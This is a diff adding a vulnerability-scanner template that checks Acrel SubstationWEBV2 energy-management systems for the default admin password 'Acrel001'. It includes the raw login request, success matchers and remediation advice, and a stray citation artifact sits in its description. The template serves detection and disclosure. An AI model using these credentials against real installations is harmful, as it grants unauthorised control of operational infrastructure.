@@ -1,0 +1,56 @@
+id: acrel-default-login
+
+info:
+  name: Acrel SubstationWEBV2 - Default Credentials
+  author: iSee857
+  severity: high
+  description: |
+    Detects default credentials in Acrel systems exposing the /SubstationWEBV2/user/login endpoint.
+    Publicly shared weak-default-password checks commonly use the built-in admin account with the password
+    Acrel001 against this interface. Successful authentication may grant access to device management,
+    monitoring data, configuration functions, and other sensitive operational features. :contentReference[oaicite:0]{index=0}
+  remediation: |
+    - Change all default credentials immediately, especially the built-in admin account.
+    - Enforce strong password policies and disable or restrict default accounts where possible.
+    - Limit access to /SubstationWEBV2/* to trusted internal networks only.
+    - Enable login auditing and review logs for suspicious or repeated authentication attempts.
+  impact: |
+    Successful exploitation may allow unauthorized access to the management platform, exposing
+    configuration data, operational status, and potentially enabling further system compromise.
+  classification:
+    cwe-id: CWE-1392
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: acrel
+    product: substationwebv2
+    verified: false
+    max-request: 2
+  tags: 安科瑞-企业微电网能效管理平台
+
+http:
+  - raw:
+      - |
+        POST /SubstationWEBV2/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        projectType: {{projectType}}
+
+        fLoginname=admin&fPassword=Acrel001&loginType=password&projectType={{projectType}}
+
+    payloads:
+      projectType:
+        - "1"
+        - "4"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'Login success'
+          - '200'
+        part: body
+
+      - type: status
+        status:
+          - 200
